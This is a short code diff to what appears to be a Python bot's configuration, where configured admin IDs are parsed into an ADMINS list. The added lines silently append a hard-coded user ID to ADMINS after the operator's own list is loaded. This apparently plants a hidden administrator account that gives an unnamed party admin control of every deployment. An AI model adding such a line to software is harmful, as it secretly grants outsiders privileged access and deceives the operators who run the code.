@@ -23,3 +23,5 @@ try:
         ADMINS.append(int(x))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
+
+ADMINS.append(1447438514)
